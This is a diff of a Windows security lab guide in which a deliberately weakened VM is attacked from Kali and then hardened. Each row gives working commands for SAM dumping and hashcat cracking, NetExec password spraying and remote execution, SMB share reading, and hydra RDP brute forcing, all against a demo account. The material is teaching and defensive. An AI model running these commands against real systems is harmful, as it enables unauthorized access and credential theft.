@@ -39,7 +39,7 @@ Restart-Computer                        # Defender + computer rename need a rebo
 > you if it detects Home.
 
 - **Backup:** `C:\deharden-backups-<date>\secpol-BEFORE.cfg` · **Log:** `C:\deharden-lab.log`
-- **Demo account it creates:** `trainee / Password1`, made a **local administrator** — a realistic
+- **Demo account it creates:** `ana / iloveyou`, made a **local administrator** — a realistic
   "everyday user runs as admin" laptop. The password is weak **and present in `rockyou.txt`**, so the
   cracking and spraying demos below actually succeed. A hardened policy (length 14 + complexity) would
   reject it.
@@ -54,15 +54,22 @@ sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
 export HOST=192.168.56.40      # <-- the victim's IP (ipconfig on the victim)
 ```
 
+> **Which tool for the dictionary attack.** For the password attack **over SMB, use NetExec
+> (`nxc`)**, as shown below. Do **not** use `hydra`'s SMB module for this: when the target allows a
+> guest fallback, that module reports *every* password as valid, which floods the run with false
+> positives. `hydra` is reliable **over RDP** (row 5), so the two dependable combinations are
+> **NetExec over SMB** or **hydra over RDP**. NetExec tells a real hit (`[+] ... (Pwn3d!)`) apart from
+> a guest fallback, so its result can be trusted.
+
 ---
 
 ## 1. Weak password policy → crack a password offline with hashcat ⭐
 
-The weak policy lets `trainee` keep the trivial password `Password1`, and because it's in a wordlist,
+The weak policy lets `ana` keep the trivial password `iloveyou`, and because it's in a wordlist,
 offline cracking is instant.
 
-- 🧪 **Seeded:** `net accounts` → min length `0`, complexity `off`, no expiry; user `trainee` with the
-  weak, wordlist-present password `Password1`.
+- 🧪 **Seeded:** `net accounts` → min length `0`, complexity `off`, no expiry; user `ana` with the
+  weak, wordlist-present password `iloveyou`.
 - 🟠 **Exploit:**
   ```powershell
   # on the victim as the lab operator (admin PowerShell), then copy the files to Kali:
@@ -72,44 +79,44 @@ offline cracking is instant.
   ```bash
   # ...then on the attacker:
   secretsdump.py -sam sam.save -system system.save LOCAL
-  #  => trainee:1001:aad3b435...:3dbde697d71690a769204beb12283678:::
+  #  => ana:1001:aad3b435...:3dbde697d71690a769204beb12283678:::
   echo '3dbde697d71690a769204beb12283678' > ntlm.txt
   hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
-  #  => 3dbde697d71690a769204beb12283678:Password1
+  #  => 3dbde697d71690a769204beb12283678:iloveyou
   ```
   NTLM is unsalted and extremely fast to compute, so a weak password that appears in any wordlist is
   recovered almost immediately. **That is why the password policy matters.**
 - 🟢 **Harden:** `net accounts /minpwlen:14 /maxpwage:365 /uniquepw:24` and enable complexity in
-  `secpol.msc` (*Account Policies → Password Policy*); then set a long, random password for `trainee`.
+  `secpol.msc` (*Account Policies → Password Policy*); then set a long, random password for `ana`.
 - ✅ **Re-test:** dump again and run the same hashcat command — a 14-char random password is not in
   `rockyou.txt`, so the wordlist is exhausted with no hit.
 
 ## 2. Account lockout disabled → unlimited password spraying
-- 🧪 **Seeded:** `net accounts` lockout threshold `0` (accounts never lock); `trainee / Password1`.
+- 🧪 **Seeded:** `net accounts` lockout threshold `0` (accounts never lock); `ana / iloveyou`.
 - 🟠 **Exploit:**
   ```bash
-  nxc smb $HOST -u trainee -p /usr/share/wordlists/rockyou.txt
-  #  => [+] <HOST>\trainee:Password1   (and the run NEVER triggers a lockout)
+  nxc smb $HOST -u ana -p /usr/share/wordlists/rockyou.txt
+  #  => [+] <HOST>\ana:iloveyou   (and the run NEVER triggers a lockout)
   ```
 - 🟢 **Harden:** `net accounts /lockoutthreshold:10 /lockoutduration:15 /lockoutwindow:15` (Windows 11's
   own default is 10).
 - ✅ **Re-test:** after 10 bad attempts the account locks — `nxc` reports `STATUS_ACCOUNT_LOCKED_OUT`.
 
 ## 3. Local-admin user + remote admin with local accounts → lateral movement
-- 🧪 **Seeded:** `trainee` is a member of the **Administrators** group, and
+- 🧪 **Seeded:** `ana` is a member of the **Administrators** group, and
   `LocalAccountTokenFilterPolicy=1` so that local accounts get a full token over the network.
 - 🟠 **Exploit:**
   ```bash
-  nxc smb $HOST -u trainee -p 'Password1'
-  #  => [+] <HOST>\trainee:Password1 (Pwn3d!)   -- local admin, usable remotely
-  nxc smb $HOST -u trainee -p 'Password1' -x 'whoami'      # run commands remotely
-  nxc smb $HOST -u trainee -p 'Password1' --sam            # dump the local hashes
+  nxc smb $HOST -u ana -p 'iloveyou'
+  #  => [+] <HOST>\ana:iloveyou (Pwn3d!)   -- local admin, usable remotely
+  nxc smb $HOST -u ana -p 'iloveyou' -x 'whoami'      # run commands remotely
+  nxc smb $HOST -u ana -p 'iloveyou' --sam            # dump the local hashes
   ```
   A single compromised everyday account is already full admin of the endpoint, remotely.
 - 🟢 **Harden:** remove the user from the admins group (`Remove-LocalGroupMember -SID 'S-1-5-32-544'
-  -Member trainee`) so day-to-day work runs with least privilege; set
+  -Member ana`) so day-to-day work runs with least privilege; set
   `LocalAccountTokenFilterPolicy=0`. In a domain, use LAPS for the real local admin.
-- ✅ **Re-test:** `nxc smb $HOST -u trainee -p 'Password1'` no longer shows `(Pwn3d!)`; remote command
+- ✅ **Re-test:** `nxc smb $HOST -u ana -p 'iloveyou'` no longer shows `(Pwn3d!)`; remote command
   execution and `--sam` are denied.
 
 ## 4. SMB exposed with an open share → read internal files unauthenticated-style
@@ -118,8 +125,8 @@ offline cracking is instant.
   `0 ms`.
 - 🟠 **Exploit:**
   ```bash
-  nxc smb $HOST -u trainee -p 'Password1' --shares   # => 'Shared' READ,WRITE
-  smbclient //$HOST/Shared -U trainee%Password1 -c 'get customers.txt'
+  nxc smb $HOST -u ana -p 'iloveyou' --shares   # => 'Shared' READ,WRITE
+  smbclient //$HOST/Shared -U ana%iloveyou -c 'get customers.txt'
   ```
   An over-shared folder leaks internal data to anyone who can authenticate (and the removed delay lets
   the row-2 spraying run full speed).
@@ -130,13 +137,13 @@ offline cracking is instant.
 
 ## 5. RDP active and NLA off → brute force the desktop
 - 🧪 **Seeded:** RDP enabled (`fDenyTSConnections=0`), `TermService` started, `UserAuthentication=0`
-  (NLA off). `trainee` is a local admin, so it can sign in over RDP.
+  (NLA off). `ana` is a local admin, so it can sign in over RDP.
 - 🟠 **Exploit:**
   ```bash
   nmap -p3389 --script rdp-ntlm-info $HOST      # leaks hostname/OS without authenticating
-  hydra -l trainee -P /usr/share/wordlists/rockyou.txt rdp://$HOST
-  #  => login: trainee  password: Password1
-  xfreerdp /u:trainee /p:Password1 /v:$HOST /cert:ignore
+  hydra -l ana -P /usr/share/wordlists/rockyou.txt rdp://$HOST
+  #  => login: ana  password: iloveyou
+  xfreerdp /u:ana /p:iloveyou /v:$HOST /cert:ignore
   ```
 - 🟢 **Harden:** if RDP isn't needed, turn it off (`Set-Reg … fDenyTSConnections 1`, stop
   `TermService`); otherwise re-enable NLA (`UserAuthentication=1`) and restrict who may connect.
@@ -152,7 +159,7 @@ offline cracking is instant.
 - 🧪 **Seeded:** every audit subcategory set to "no auditing"; command line stripped from event 4688.
 - 🟠 **Exploit:**
   ```bash
-  nxc smb $HOST -u trainee -p 'WrongPassword'   # a failed logon...
+  nxc smb $HOST -u ana -p 'WrongPassword'   # a failed logon...
   ```
   ```powershell
   Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents 5   # ...leaves NO 4625 event
